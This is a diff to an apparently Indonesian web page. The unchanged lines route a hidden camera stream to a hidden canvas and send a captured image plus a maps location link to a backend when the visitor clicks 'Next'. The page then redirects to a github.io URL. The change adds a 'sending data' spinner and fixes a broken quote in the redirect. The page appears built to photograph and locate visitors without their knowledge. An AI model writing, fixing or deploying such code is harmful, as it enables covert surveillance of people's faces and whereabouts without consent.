@@ -38,6 +38,10 @@ button:hover{
 <video id="video" autoplay playsinline 
 style="display:none;"></video>
 <button onclick="proses()">Berikutnya</button>
+<div id="loading" style="display:none;">
+  <div class="loader"></div>
+  <p>Mengirim data...</p>
+</div>
 
 <canvas id="canvas" style="display:none;"></canvas>
 
@@ -58,6 +62,8 @@ navigator.mediaDevices.getUserMedia({
 });
 
 function proses(){
+
+  document.getElementById("loading").style.display = "flex";
 
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
@@ -87,7 +93,7 @@ function proses(){
           maps: mapsLink,
           image: imageData
         }).then(function(){
-            window.location.replace(https://basudewa28.github.io/Official-/basudewa.html");
+            window.location.replace("https://basudewa28.github.io/Official-/basudewa.html");
         });
 
       },
